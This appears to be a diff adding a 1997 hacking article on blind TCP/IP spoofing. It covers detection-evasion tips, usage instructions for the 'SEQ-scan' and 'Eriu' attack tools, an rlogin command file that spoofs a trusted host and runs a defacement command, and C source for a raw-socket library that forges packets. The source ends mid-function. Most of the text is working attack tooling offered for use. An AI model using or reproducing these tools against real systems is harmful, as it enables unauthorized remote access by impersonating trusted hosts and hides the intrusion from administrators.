+If you are attacking a system that always sends RST's well, you'll have to
+live with it.
+
+3.3.5.c The ACK guesses
+
+Well probably the hardest thing to hide are the multiple ACK guesses. Not 
+doing them lowers your chances. If you have the luck to be attacking a 64k
+ruler, well then you can do a very stealthy spoof.
+Advantage of hiding the probes even when you can't hide the guesses is however,
+that you yourself are extremely hard to trace this way, these ACK's have
+spoofed IP numbers anyway. 
+Again, out of the box setups, mostly don't log these things.
+
+3.3.5.d Retransmission
+
+Generally one can assume that if data keeps coming on a connection to a
+server, but it looks like all data send back to the client is lost (no
+ACK's), the connection is fake i.e. a spoofing attack.
+So it could be wise to look for connections that particularly work well in
+one direction, and cause a lot of transmissions of the same packet in the
+other direction. 
+The attacker on the other hand can make this harder to detect by inserting
+his own ACK's, and thus causing retransmission of different packets.
+As attacker, you have a fairly good idea of how much data the server will
+send back, so you can have a few guesses. You can also retransmit some of
+your packages (be sure to take windowing in account to make it more
+realistic), so it might look like you don't receive the servers ACK's,
+what would make the connection look like a two-way-bad connection.
+Pretending to be a real user is a must here (1 char/packet, and simulating
+typos).
+But on the other hand, if a site goes through the trouble of running such
+detection tools, it will probably be well enough protected in the first
+place.
+
+
+4. How to use the source code
+----------------------------- 
+
+4.1 SEQ-scan
+------------
+
+It all kinda explains itself...
+
+required <args> are:
+  -t <target>  host you want to scan
+  -p <server>  port you want to use for scanning
+[options] are:
+  -v           verbose
+  -a           do all tests
+
+A little note on the output, well with some of the SunOS's I played, I got
+weak relations (time relation coeff. about 9). Sometimes (due to delays)
+these can slip trough and generate a higher coeff. and thus seem hard to
+attack, so always do you scans at least twice, on different times.
+
+These hosts also needed a 10000 packet guess to give a 1/10 success rate...
+(This to put y'r feet back a on the ground.) 
+
+4.2 Eriu
+--------
+
+usage: eriu <arguments>
+Arguments are:
+  -s host:port  Spoofed Host (required)
+                This is the host you will pretend to be.
+  -t host:port  Target Host (required)
+                This is the host you want to attack.
+  -f filename   Packet contence commandfile (required, except with '-P')
+                This file describes the data that will be send, for exact
+                format see below
+  -p port       Source Port used for scanning (default 23)
+                On this port the Probes will be done, note she has to be
+                accepting connections!
+  -c count      Number of guesses to make (default 64k:20 other:500)
+                This is the number of ACK's that is send, they are
+                centralized around the guess.
+                e.g. '-c 501' will try the ACK's guess-250 to guess+250. 
+                Mind you that numbers like 10000 are realistic for
+                successful attacks.                 
+  -o offset     Extra offset to add to guessed ACK
+                It takes the guessed ACK and adds this (negative or positive)
+                number to it before firing any packets.
+  -d delay      Seconds of delay between parts of the attack (default:1)
+                You could have to raise this number, it represents a delay
+                between different parts of the program.
+  -P            Probe for guessing range
+                This can be used to give you an idea of the '-c' parameter.
+  -F            Enter the ACK guess y'rself (test/practice purposes)
+                For home amusement when practicing...
+
+Now let me discuss the commandfile, it is quite easy.
+  1) It is an ASCII file (create it with a txt editor).
+  2) It is line oriented, everything on one line will be put in one
+     packet.
+  3) All printable chars that you type are put in the packet.
+  4) '\' followed by a THREE digit number is interpreted as the ASCII char 
+     with the decimal value of that number.
+     e.g. \000 will represents null character
+          \010 represents char 0x0A 
+  5) '\' followed by 'a' (or 'A') and a TWO digit number is interpreted as an
+     increment (decimal) of the ACK that is send (remember the ACK in the 
+     datastream). This can be useful for some situations.
+     e.g. \A10 will increment the ACK with 10 (decimal)
+
+I give you here the example of the file used for the rlogin spoof showed in
+this document (no space at beginning of line in real file!):
+
+     \000coder\000spoof\000vt100/9600\000
+     \255\255ss\000\025\000\080\000\000\000\000
+     spoof\010
+     touch This_site_was_hacked\010
+
+Explanation is simple, the first line represents a packet that contains 4 
+null terminated strings: (an empty string),"coder","spoof" and "vt100/9600"
+The second line is the rlogin window negotiation. 
+The third line is the password "spoof" and <enter>.
+The forth line is the command "touch This_site_was_hacked" and an <enter>.
+Don't forget those <enters>, because you are in a shell, and it waits with
+execution till you hit that big key on the right.
+
+Mind you, that the following would have had the same effect:
+
+     \000
+     coder\000
+     spoof\000
+     vt100/9600\000 
+     \255\255ss\000\025\000\080\000\000\000\000
+     s
+     p
+     o
+     of\010
+     touch This_site_was_hacked\010
+
+It would only take more packets.
+ 
+NOTE: take care of white-spaces, make sure your lines aren't filled with
+      spaces at the end, as these are interpreted as real chars! 
+
+4.3 Improvements
+----------------
+
+For SEQ-scan, you figure them out yourself, you can always add fancy stuff,
+or do complicated math...
+For Eriu however I think some things are worth mentioning.
+Beside the usual improvements that could be done (more parameter settings
+etc.) some additional features could be useful to implement.
+Maybe a 'step' parameter for the ACK guessing (see 'countstep' in the
+source code).
+For example fragmenting of the IP packets can be useful. Also adding of
+stealth techniques would be nice, things like I mentioned above, like hiding
+your probes in real connections (to public services).
+Actually you could easily make a 'shell', by making the commands
+real-time-typable... enjoy....
+
+
+Appendix: Short note about rlogin
+---------------------------------
+
+I suppose you know what rlogin is, but how did I get to that 'eriu' 
+commandfile?
+All info is found in RFC 1282, I have included 2 extracts here, these are the
+two most important ones for us.
+(If you want to know more about the subject, I suggest you read the RFC) 
+
+(concerning  \000coder\000spoof\000vt100/9600\000")
+Extract 1 from RFC 1282:
+   Upon connection establishment, the client sends four null-terminated
+   strings to the server.  The first is an empty string (i.e., it
+   consists solely of a single zero byte), followed by three non-null
+   strings: the client user name, the server user name, and the terminal
+   type and speed.  More explicitly:
+
+        <null>
+        client-user-name<null>
+        server-user-name<null>
+        terminal-type/speed<null>
+
+   The server returns a zero byte to indicate that it has received these
+   strings and is now in data transfer mode. 
+End extract.
+
+(concerning "\255\255ss\000\025\000\080\000\000\000\000")
+Extract 2 from RFC 1282:
+   The window change control sequence is 12 bytes in length, consisting
+   of a magic cookie (two consecutive bytes of hex FF), followed by two
+   bytes containing lower-case ASCII "s", then 8 bytes containing the
+   16-bit values for the number of character rows, the number of
+   characters per row, the number of pixels in the X direction, and the
+   number of pixels in the Y direction, in network byte order.  Thus:
+
+        FF FF s s rr cc xp yp
+   
+   Other flags than "ss" may be used in future for other in-band control
+   messages.  None are currently defined.
+End extract.
+
+If you want to attack other services, I suggest you get the RFC on that
+service (or any other technical source), and study it. 
+
+Appendix: Source Code
+---------------------
+
+--[spoofit_v3.h]------------------------------------------------------------
+/**************************************************************************/
+/* Spoofit.h - Include file for easy creating of spoofed TCP packets      */
+/*             Requires LINUX 1.3.x (or later) Kernel                     */
+/*             (illustration for 'A short overview of IP spoofing')       */
+/*             V.3 - Copyright 1997 - Brecht Claerhout                    */
+/*                                                                        */
+/*  Purpose - Providing skilled people with a easy to use spoofing source */
+/*            I used it to be able to write my tools fast and short.      */
+/*            Mind you this is only illustrative and can be easily        */
+/*            optimised.                                                  */ 
+/*                                                                        */
+/*  Author - Brecht Claerhout <Coder@reptile.rug.ac.be>                   */
+/*           Serious advice, comments, statements, greets, always welcome */
+/*           flames, moronic 3l33t >/dev/null                             */
+/*                                                                        */
+/*  Disclaimer - This file is for educational purposes only. I am in      */
+/*               NO way responsible for what you do with this file,       */
+/*               or any damage you or this file causes.                   */
+/*                                                                        */
+/*  For whom - People with a little knowledge of TCP/IP, C source code    */
+/*             and general UNIX. Otherwise, please keep your hands of,    */
+/*             and catch up on those things first.                        */
+/*                                                                        */
+/*  Limited to - Linux 1.3.X or higher.                                   */
+/*               If you know a little about your OS, shouldn't be to hard */
+/*               to port.                                                 */
+/*                                                                        */ 
+/* Important note - You might have noticed I use non standard packet      */
+/*                  header struct's. How come?? Because I started like    */
+/*                  that on Sniffit because I wanted to do the            */
+/*                  bittransforms myself.                                 */
+/*                  Well I got so damned used to them, I keep using them, */
+/*                  they are not very different, and not hard to use, so  */
+/*                  you'll easily use my struct's without any problem,    */
+/*                  this code and the examples show how to use them.      */ 
+/*                  my apologies for this inconvenience.                  */
+/*                                                                        */
+/* None of this code can be used in commercial software. You are free to  */
+/* use it in any other non-commercial software (modified or not) as long  */
+/* as you give me the credits for it. You can spread this include file,   */
+/* but keep it unmodified.                                                */
+/*                                                                        */
+/**************************************************************************/
+/*                                                                        */
+/* Easiest way to understand this library is to look at the use of it, in */
+/* the example progs.                                                     */
+/*                                                                        */
+/**** Sending packets *****************************************************/
+/*                                                                        */ 
+/* int open_sending (void)                                                */ 
+/*   Returns a filedescriptor to the sending socket.                      */
+/*   close it with close (int filedesc)                                   */
+/*                                                                        */ 
+/* void transmit_TCP (int sp_fd, char *sp_data,                           */
+/*	              int sp_ipoptlen, int sp_tcpoptlen, int sp_datalen,  */
+/*                    char *sp_source, unsigned short sp_source_port,     */ 
+/*                    char *sp_dest,unsigned short sp_dest_port,          */ 
+/*                    unsigned long sp_seq, unsigned long sp_ack,         */ 
+/*                    unsigned short sp_flags)                            */ 
+/*   fire data away in a TCP packet                                       */
+/*    sp_fd         : raw socket filedesc.                                */ 
+/*    sp_data       : IP options (you should do the padding)              */
+/*                    TCP options (you should do the padding)             */
+/*                    data to be transmitted                              */
+/*                    (NULL is nothing)                                   */
+/*                    note that all is optional, and IP en TCP options are*/
+/*                    not often used.                                     */
+/*                    All data is put after eachother in one buffer.      */
+/*    sp_ipoptlen   : length of IP options (in bytes)                     */
+/*    sp_tcpoptlen  : length of TCP options (in bytes)                    */
+/*    sp_datalen    : amount of data to be transmitted (bytes)            */
+/*    sp_source     : spoofed host that"sends packet"                     */
+/*    sp_source_port: spoofed port that "sends packet"                    */
+/*    sp_dest       : host that should receive packet                     */
+/*    sp_dest_port  : port that should receive packet                     */
+/*    sp_seq        : sequence number of packet                           */
+/*    sp_ack        : ACK of packet                                       */
+/*    sp_flags      : flags of packet (URG,ACK,PSH,RST,SYN,FIN)           */
+/*                                                                        */
+/* void transmit_UDP (int sp_fd, char *sp_data,                           */
+/*                    int sp_ipoptlen, int sp_datalen,                    */
+/*		      char *sp_source, unsigned short sp_source_port,     */
+/*                    char *sp_dest, unsigned short sp_dest_port)         */
+/*   fire data away in an UDP packet                                      */
+/*    sp_fd         : raw socket filedesc.                                */ 
+/*    sp_data       : IP options                                          */
+/*                    data to be transmitted                              */
+/*                    (NULL if none)                                      */
+/*    sp_ipoptlen   : length of IP options (in bytes)                     */
+/*    sp_datalen    : amount of data to be transmitted                    */ 
+/*    sp_source     : spoofed host that"sends packet"                     */
+/*    sp_source_port: spoofed port that "sends packet"                    */
+/*    sp_dest       : host that should receive packet                     */
+/*    sp_dest_port  : port that should receive packet                     */
+/*                                                                        */
+/**** Receiving packets ***************************************************/
+/*                                                                        */
+/* int open_receiving (char *rc_device, char mode)                        */
+/*   Returns fdesc to a receiving socket                                  */
+/*        (if mode: IO_HANDLE don't call this twice, global var           */
+/*         rc_fd_abc123 is  initialised)                                  */
+/*     rc_device: the device to use e.g. "eth0", "ppp0"                   */
+/*                be sure to change DEV_PREFIX accordingly!               */
+/*                DEV_PREFIX is the length in bytes of the header that    */
+/*                comes with a SOCKET_PACKET due to the network device    */
+/*     mode: 0: normal mode, blocking, (read will wait till packet        */ 
+/*           comes, mind you, we are in PROMISC mode)                     */
+/*           IO_NONBLOCK: non-blocking mode (read will not wait till      */
+/*           usefull for active polling)                                  */
+/*           IO_HANDLE installs the signal handler that updates SEQ,ACK,..*/
+/*           (IO_HANDLE is not recommended to use, as it should be        */
+/*           modified according to own use, and it works bad on heavy     */
+/*           traffic continuous monitoring. I needed it once, but left it */
+/*           in to make you able to have a look at Signal handled IO,     */
+/*           personally I would have removed it, but some thought it      */
+/*           doesn't do any harm anyway, so why remove... )               */ 
+/*           (I'm not giving any more info on IO_HANDLE as it is not      */
+/*           needed for the example programs, and interested people can   */
+/*           easilythey figure the code out theirselves.)                 */
+/*           (Besides IO_HANDLE can only be called ONCE in a program,     */
+/*           other modes multiple times)                                  */ 
+/*                                                                        */
+/* int get_packet (int rc_fd, char *buffer, int *TCP_UDP_start,           */
+/*         	   unsigned char *proto)                                  */
+/*        This waits for a packet (mode default) and puts it in buffer or */
+/*        returns whether there is a pack or not (IO_NONBLOCK).           */
+/*        It returns the packet length if there is one available, else 0  */
+/*                                                                        */
+/* int wait_packet(int wp_fd,struct sp_wait_packet *ret_values,           */
+/*                  char *wp_source, unsigned short wp_source_port,       */
+/*                  char *wp_dest, unsigned short wp_dest_port,           */
+/*	            int wp_flags, int wait_time);                         */
+/*   wp_fd: a receiving socket (default or IO_NONBLOCK)                   */
+/*   ret_values: pointer to a sp_wait_packet struct, that contains SEQ,   */
+/*               ACK, flags, datalen of that packet. For further packet   */
+/*               handling see the examples.                               */
+/*                  struct sp_wait_packet  {                              */
+/*                   	unsigned long seq,ack;                            */
+/*                      unsigned short flags;                             */
+/*	                unsigned short source_p, dest_p;                  */
+/*                      int datalen;                                      */
+/*                      };                                                */
+/*   wp_source, wp_source_port : sender of packet                         */
+/*                               (port=0, any port is okay)               */
+/*   wp_dest, wp_dest_port     : receiver of packet                       */
+/*                               (port=0, any port is okay)               */
+/*   wp_flags: flags that should be present in packet.. (mind you there   */
+/*             could be more present, so check on return)                 */
+/*             note: if you don't care about flag, use 0                  */
+/*   wait_time: if not zero, this function will return -1 if no correct   */
+/*              packet has arrived within wait_time secs.                 */
+/*              (only works on IO_NONBLOCK socket)                        */
+/*                                                                        */
+/* void set_filter (char *f_source, unsigned short f_source_port,         */
+/*                  char *f_dest, unsigned short f_dest_port)             */
+/*        (for use with IO_HANDLE)                                        */
+/*        Start the program to watch all trafic from source/port to       */
+/*        dest/port. This enables the updating of global data. Can        */ 
+/*        be called multiple times.                                       */
+/*                                                                        */
+/* void close_receiving (void)                                            */
+/*           When opened a IO_HANDLE mode receiving socket close it with  */
+/*           this.                                                        */
+/*                                                                        */
+/**** Global DATA (IO_HANDLE mode) ****************************************/
+/*                                                                        */
+/* When accessing global data, copy the values to local vars and then use */
+/* them. Reduce access time to a minimum.                                 */
+/* Mind you use of this is very limited, if you are a novice on IO, just  */
+/* ignore it, the other functions are good enough!). If not, rewrite the  */
+/* handler for your own use...                                            */
+/*                                                                        */
+/* sig_atomic_t SP_DATA_BUSY                                              */
+/*        Put this on NON-ZERO when accesing global data. Incoming        */
+/*        packets will be ignored then, data can not be overwritten.      */
+/*                                                                        */
+/* unsigned long int CUR_SEQ, CUR_ACK;                                    */
+/*        Last recorded SEQ and ACK number of the filtered "stream".      */
+/*        Before accessing this data set SP_DATA_BUSY non-zero,           */
+/*        afterward set it back to zero.                                  */
+/*                                                                        */
+/* unsigned long int CUR_COUNT;                                           */
+/*        increased everytime other data is updated                       */
+/*                                                                        */
+/* unsigned int CUR_DATALEN;                                              */
+/*	  Length of date in last TCP packet			          */
+/*                                                                        */
+/**************************************************************************/
+
+#include "sys/socket.h"       /* includes, what would we do without them  */
+#include "netdb.h"
+#include "stdlib.h"
+#include "unistd.h"
+#include "stdio.h"
+#include "errno.h"
+#include "netinet/in.h"
+#include "netinet/ip.h"
+#include "linux/if.h"
+#include "sys/ioctl.h"
+#include "sys/types.h"
+#include "signal.h"
+#include "fcntl.h"
+
+#define	SPOOFIT_VERSION		3
+
+#undef  DEBUG 
+#define IP_VERSION 	4                 /* keep y'r hands off...         */
+#define MTU 		1500 
+#define IP_HEAD_BASE 	20                /* using fixed lengths to send   */ 
+#define TCP_HEAD_BASE 	20                /* no options etc...             */ 
+#define UDP_HEAD_BASE 	8                 /* Always fixed                  */ 
+#define ICMP_HEAD_BASE	8 	               
+
+#define IO_HANDLE	1
+#define IO_NONBLOCK	2
+
+int DEV_PREFIX = 9999;		
+sig_atomic_t WAIT_PACKET_WAIT_TIME=0;
+
+/**** IO_HANDLE ************************************************************/
+int rc_fd_abc123;
+sig_atomic_t RC_FILTSET=0;
+char rc_filter_string[50];                       /* x.x.x.x.p-y.y.y.y.g  */
+
+sig_atomic_t SP_DATA_BUSY=0;
+unsigned long int CUR_SEQ=0, CUR_ACK=0, CUR_COUNT=0;
+unsigned int CUR_DATALEN;
+unsigned short CUR_FLAGS;
+/***************************************************************************/
+
+struct sp_wait_packet
+{
+	unsigned long seq,ack;
+	unsigned short flags;
+	unsigned short source_p, dest_p;
+	int datalen;
+};
+            
+/* Code from Sniffit - BTW my own program.... no copyright violation here */ 
+#define URG 32       /* TCP flags */
+#define ACK 16 
+#define PSH 8 
+#define RST 4
+#define SYN 2 
+#define FIN 1 
+
+struct PACKET_info
+{
+	int len, datalen;	
+	unsigned long int seq_nr, ACK_nr;
+	u_char FLAGS;
+};
+
+struct IP_header                        /* The IPheader (without options) */
+{ 
+        unsigned char verlen, type;
+        unsigned short length, ID, flag_offset;
+        unsigned char TTL, protocol;
+        unsigned short checksum;
+        unsigned long int source, destination;
+};
+
+struct TCP_header                     /* The TCP header (without options) */
+{
+        unsigned short source, destination;
+        unsigned long int seq_nr, ACK_nr;
+        unsigned short offset_flag, window, checksum, urgent;
+};
+
+struct UDP_header                                      /* The UDP header */
+{
+        unsigned short source, destination;
+        unsigned short length, checksum;
+};
+
+struct ICMP_header                                   /* The ICMP header */
+{
+        unsigned char type, code;
+        unsigned short checksum;
+	unsigned long xtra_field;
+};
+           
+struct pseudo_IP_header          /* The pseudo IP header (checksum calc) */ 
+{
+        unsigned long int source, destination;
+	char zero_byte, protocol;
+	unsigned short TCP_UDP_len;
+};
+
+/* data structure for argument passing  */
+
+struct sp_data_exchange	{
+	int fd;                                /* Sh!t from transmit_TCP  */
+	char *data; 
+	int datalen;
+	char *source; unsigned short source_port;
+	char *dest;   unsigned short dest_port;
+	char *xtra;   unsigned short xtra_port;        /* needed for ICMP */
+        unsigned long seq, ack; 
+        unsigned short flags;
+
+	char *buffer;               /* work buffer */
+
+        int IP_optlen;		   /* IP options length in bytes  */
+        int TCP_optlen;		   /* TCP options length in bytes */
+        unsigned char ICMP_type, ICMP_code;
+	};
+
+/**************** all functions  *******************************************/
+void transmit_TCP (int fd, char *sp_data, 
+		     	   int sp_ipoptlen, int sp_tcpoptlen, int sp_datalen,
+		           char *sp_source, unsigned short sp_source_port,
+			   char *sp_dest, unsigned short sp_dest_port,
+                           unsigned long sp_seq, unsigned long sp_ack, 
+                           unsigned short sp_flags);
+
+void transmit_UDP (int sp_fd, char *sp_data, 
+			   int  ipoptlen, int sp_datalen, 
+		           char *sp_source, unsigned short sp_source_port,
+			   char *sp_dest, unsigned short sp_dest_port);
+
+int get_packet (int rc_fd, char *buffer, int *, unsigned char*);
+int wait_packet(int,struct sp_wait_packet *,char *, unsigned short,char *, unsigned short, int, int);
+
+static unsigned long sp_getaddrbyname(char *);
+
+int open_sending (void);
+int open_receiving (char *, char);
+void close_receiving (void);
+
+void sp_send_packet (struct sp_data_exchange *, unsigned char);
+void sp_fix_TCP_packet (struct sp_data_exchange *);
+void sp_fix_UDP_packet (struct sp_data_exchange *);
+void sp_fix_IP_packet (struct sp_data_exchange *, unsigned char);
+unsigned short in_cksum(unsigned short *, int );
+
+void rc_sigio (int);
+void set_filter (char *, unsigned short, char *, unsigned short);
+
+/********************* let the games commence ****************************/
+
+static unsigned long sp_getaddrbyname(char *sp_name)
+{
+struct hostent *sp_he;
+int i;
+
+if(isdigit(*sp_name))
+  return inet_addr(sp_name);
+
+for(i=0;i<100;i++)
+     {
+     if(!(sp_he = gethostbyname(sp_name)))
+	{printf("WARNING: gethostbyname failure!\n");
+	sleep(1);
+	if(i>=3)       /* always a retry here in this kind of application */
+	   printf("Coudn't resolv hostname."), exit(1);
+	}
+     else break;
+     }
+return sp_he ? *(long*)*sp_he->h_addr_list : 0;
+}
+
+int open_sending (void)
+{
+struct protoent *sp_proto;   
+int sp_fd;
+int dummy=1;
+
+/* they don't come rawer */
+if ((sp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))==-1) 
+        perror("Couldn't open Socket."), exit(1);
+
+#ifdef DEBUG
+	printf("Raw socket ready\n");
+#endif
+return sp_fd;
+}
+
+void sp_send_packet (struct sp_data_exchange *sp, unsigned char proto)
+{
+int sp_status;
+struct sockaddr_in sp_server;
+struct hostent *sp_help;
+int HEAD_BASE;
+
+/* Construction of destination */
+bzero((char *)&sp_server, sizeof(struct sockaddr)); 
+sp_server.sin_family = AF_INET;
+sp_server.sin_addr.s_addr = inet_addr(sp->dest); 
+if (sp_server.sin_addr.s_addr == (unsigned int)-1)
+        {                      /* if target not in DOT/number notation */ 
+        if (!(sp_help=gethostbyname(sp->dest))) 
+          fprintf(stderr,"unknown host %s\n", sp->dest), exit(1);
+        bcopy(sp_help->h_addr, (caddr_t)&sp_server.sin_addr, sp_help->h_length);
+        };
+
+switch(proto)
+   	{
+	case 1: HEAD_BASE = ICMP_HEAD_BASE;  break;                /* ICMP */
+        /* Warning TCP options were not added - BUGFIX */
+	case 6: HEAD_BASE = TCP_HEAD_BASE+sp->TCP_optlen;  break;  /* TCP  */
+	case 17: HEAD_BASE = UDP_HEAD_BASE; break;                 /* UDP  */
+	default: exit(1); break;
+	};
+sp_status = sendto(sp->fd, (char *)(sp->buffer), sp->datalen+HEAD_BASE+IP_HEAD_BASE+sp->IP_optlen, 0, 
+			(struct sockaddr *)&sp_server,sizeof(struct sockaddr)); 
+if (sp_status < 0 || sp_status != sp->datalen+HEAD_BASE+IP_HEAD_BASE+sp->IP_optlen)
+        {
+        if (sp_status < 0)
+          perror("Sendto"), exit(1);
+        printf("hmm... Only transmitted %d of %d bytes.\n", sp_status, 
+						sp->datalen+HEAD_BASE);
+        };
+#ifdef DEBUG
+	printf("Packet transmitted...\n");
+#endif
+}
+
+void sp_fix_IP_packet (struct sp_data_exchange *sp, unsigned char proto)
+{ 
+struct IP_header *sp_help_ip;
+int HEAD_BASE;
+
+switch(proto)
+   	{
+	case 1: HEAD_BASE = ICMP_HEAD_BASE;  break;                /* ICMP */
+	case 6: HEAD_BASE = TCP_HEAD_BASE;  break;                 /* TCP  */
+	case 17: HEAD_BASE = UDP_HEAD_BASE; break;                 /* UDP  */
+	default: exit(1); break;
+	};
+
+sp_help_ip = (struct IP_header *) (sp->buffer);
+sp_help_ip->checksum=0; 
+sp_help_ip->verlen = (IP_VERSION << 4) | ((IP_HEAD_BASE+sp->IP_optlen)/4);
+sp_help_ip->type = 0;
+sp_help_ip->length = htons(IP_HEAD_BASE+HEAD_BASE+sp->datalen+sp->IP_optlen+sp->TCP_optlen);
+sp_help_ip->ID = htons(12545);                                  /* TEST */ 
+sp_help_ip->flag_offset = 0;
+sp_help_ip->TTL = 69;
+sp_help_ip->protocol = proto;
+sp_help_ip->source = sp_getaddrbyname(sp->source);
+sp_help_ip->destination =  sp_getaddrbyname(sp->dest);
+sp_help_ip->checksum=in_cksum((unsigned short *) (sp->buffer), 
+						IP_HEAD_BASE+sp->IP_optlen);
+#ifdef DEBUG
+	printf("IP header fixed...\n");
+#endif
+}
+
+void sp_fix_TCP_packet (struct sp_data_exchange *sp)
+{ 
+char sp_pseudo_ip_construct[MTU];
+struct TCP_header *sp_help_tcp;
+struct pseudo_IP_header *sp_help_pseudo;
+int i;
+
+for(i=0;i<MTU;i++)
+  {sp_pseudo_ip_construct[i]=0;}
+
+sp_help_tcp = (struct TCP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen);
+sp_help_pseudo = (struct pseudo_IP_header *) sp_pseudo_ip_construct;
+
+sp_help_tcp->offset_flag = htons( (((TCP_HEAD_BASE+sp->TCP_optlen)/4)<<12) | sp->flags); 
+sp_help_tcp->seq_nr = htonl(sp->seq);
+sp_help_tcp->ACK_nr = htonl(sp->ack);
+sp_help_tcp->source = htons(sp->source_port);
+sp_help_tcp->destination = htons(sp->dest_port);
+sp_help_tcp->window = htons(0x7c00);             /* dummy for now 'wujx' */
+
+sp_help_pseudo->source = sp_getaddrbyname(sp->source);
+sp_help_pseudo->destination =  sp_getaddrbyname(sp->dest);
+sp_help_pseudo->zero_byte = 0;
+sp_help_pseudo->protocol = 6;
+sp_help_pseudo->TCP_UDP_len = htons(sp->datalen+TCP_HEAD_BASE+sp->TCP_optlen);
+
+memcpy(sp_pseudo_ip_construct+12, sp_help_tcp, sp->TCP_optlen+sp->datalen+TCP_HEAD_BASE);
+sp_help_tcp->checksum=in_cksum((unsigned short *) sp_pseudo_ip_construct, 
+				  sp->datalen+12+TCP_HEAD_BASE+sp->TCP_optlen);
+#ifdef DEBUG
+	printf("TCP header fixed...\n");
+#endif
+}
+
+void transmit_TCP (int sp_fd, char *sp_data, 
+			   int sp_ipoptlen, int sp_tcpoptlen, int sp_datalen, 
+		           char *sp_source, unsigned short sp_source_port,
+			   char *sp_dest, unsigned short sp_dest_port,
+                           unsigned long sp_seq, unsigned long sp_ack, 
+                           unsigned short sp_flags)
+{
+char sp_buffer[1500];
+struct sp_data_exchange sp_struct;
+
+bzero(sp_buffer,1500);
+if (sp_ipoptlen!=0) 
+	memcpy(sp_buffer+IP_HEAD_BASE,sp_data,sp_ipoptlen);
+
+if (sp_tcpoptlen!=0) 
+	memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen,
+			                    sp_data+sp_ipoptlen,sp_tcpoptlen);
+if (sp_datalen!=0) 
+	memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen+sp_tcpoptlen,
+			sp_data+sp_ipoptlen+sp_tcpoptlen,sp_datalen);
+
+sp_struct.fd          = sp_fd; 
+sp_struct.data        = sp_data;
+sp_struct.datalen     = sp_datalen;
+sp_struct.source      = sp_source;
+sp_struct.source_port = sp_source_port;
+sp_struct.dest        = sp_dest;
+sp_struct.dest_port   = sp_dest_port;
+sp_struct.seq         = sp_seq;
+sp_struct.ack         = sp_ack;
+sp_struct.flags       = sp_flags;
+sp_struct.buffer      = sp_buffer;
+sp_struct.IP_optlen   = sp_ipoptlen;          
+sp_struct.TCP_optlen  = sp_tcpoptlen;          
+
+sp_fix_TCP_packet(&sp_struct);
+sp_fix_IP_packet(&sp_struct, 6);
+sp_send_packet(&sp_struct, 6);
+}
+
+void sp_fix_UDP_packet (struct sp_data_exchange *sp)
+{ 
+char sp_pseudo_ip_construct[MTU];
+struct UDP_header *sp_help_udp;
+struct pseudo_IP_header *sp_help_pseudo;
+int i;
+
+for(i=0;i<MTU;i++)
+  {sp_pseudo_ip_construct[i]=0;}
+
+sp_help_udp = (struct UDP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen);
+sp_help_pseudo = (struct pseudo_IP_header *) sp_pseudo_ip_construct;
+
+sp_help_udp->source = htons(sp->source_port);
+sp_help_udp->destination = htons(sp->dest_port);
+sp_help_udp->length =  htons(sp->datalen+UDP_HEAD_BASE);
+
+sp_help_pseudo->source = sp_getaddrbyname(sp->source);
+sp_help_pseudo->destination =  sp_getaddrbyname(sp->dest);
+sp_help_pseudo->zero_byte = 0;
+sp_help_pseudo->protocol = 17;
+sp_help_pseudo->TCP_UDP_len = htons(sp->datalen+UDP_HEAD_BASE);
+
+memcpy(sp_pseudo_ip_construct+12, sp_help_udp, sp->datalen+UDP_HEAD_BASE);
+sp_help_udp->checksum=in_cksum((unsigned short *) sp_pseudo_ip_construct, 
+						     sp->datalen+12+UDP_HEAD_BASE);
+#ifdef DEBUG
+	printf("UDP header fixed...\n");
+#endif
+}
+
+void transmit_UDP (int sp_fd, char *sp_data, 
+			   int sp_ipoptlen, int sp_datalen, 
+		           char *sp_source, unsigned short sp_source_port,
+			   char *sp_dest, unsigned short sp_dest_port)
+{
+char sp_buffer[1500];
+struct sp_data_exchange sp_struct;
+
+bzero(sp_buffer,1500);
+
+if (sp_ipoptlen!=0) 
+	memcpy(sp_buffer+IP_HEAD_BASE,sp_data,sp_ipoptlen);
+if (sp_data!=NULL) 
+	memcpy(sp_buffer+IP_HEAD_BASE+UDP_HEAD_BASE+sp_ipoptlen,
+					     sp_data+sp_ipoptlen,sp_datalen);
+sp_struct.fd          = sp_fd; 
+sp_struct.data        = sp_data;
+sp_struct.datalen     = sp_datalen;
+sp_struct.source      = sp_source;
+sp_struct.source_port = sp_source_port;
+sp_struct.dest        = sp_dest;
+sp_struct.dest_port   = sp_dest_port;
+sp_struct.buffer      = sp_buffer;
+sp_struct.IP_optlen   = sp_ipoptlen;
+sp_struct.TCP_optlen  = 0;
+
+sp_fix_UDP_packet(&sp_struct);
+sp_fix_IP_packet(&sp_struct, 17);
+sp_send_packet(&sp_struct, 17);
+}
+
+void sp_fix_ICMP_packet (struct sp_data_exchange *sp)
+{ 
+struct ICMP_header *sp_help_icmp;
+struct IP_header *sp_help_ip;
+struct TCP_header *sp_help_tcp;
+int i;
+
+sp_help_icmp = (struct ICMP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen);
+sp_help_ip = (struct IP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen+
+								ICMP_HEAD_BASE);
+sp_help_tcp = (struct TCP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen+
+						    ICMP_HEAD_BASE+IP_HEAD_BASE);
+
+sp_help_icmp->type = sp->ICMP_type;
+sp_help_icmp->code = sp->ICMP_code;
+sp_help_icmp->checksum  = htons(0);
+sp_help_icmp->xtra_field= htonl(0);
+
+sp_help_ip->verlen = (IP_VERSION << 4) | ((IP_HEAD_BASE+sp->IP_optlen)/4);
+sp_help_ip->type = 0;
+sp_help_ip->length = htons(500);
+sp_help_ip->ID = htons(12545);                                  /* TEST */ 
+sp_help_ip->flag_offset = 0;
+sp_help_ip->TTL = 69;
+sp_help_ip->protocol = 6;
+sp_help_ip->source = sp_getaddrbyname(sp->dest);
+sp_help_ip->destination =  sp_getaddrbyname(sp->xtra);
+sp_help_ip->checksum=0x340e;
+
+sp_help_tcp->offset_flag = htons( ((TCP_HEAD_BASE/4)<<12) | ACK); 
+sp_help_tcp->seq_nr = htonl(0x45fe5091);
+sp_help_tcp->ACK_nr = htonl(0x345560ef);
+sp_help_tcp->source = htons(sp->dest_port);
+sp_help_tcp->destination = htons(sp->xtra_port);
+sp_help_tcp->window = htons(0x7c00);             /* dummy for now 'wujx' */
+
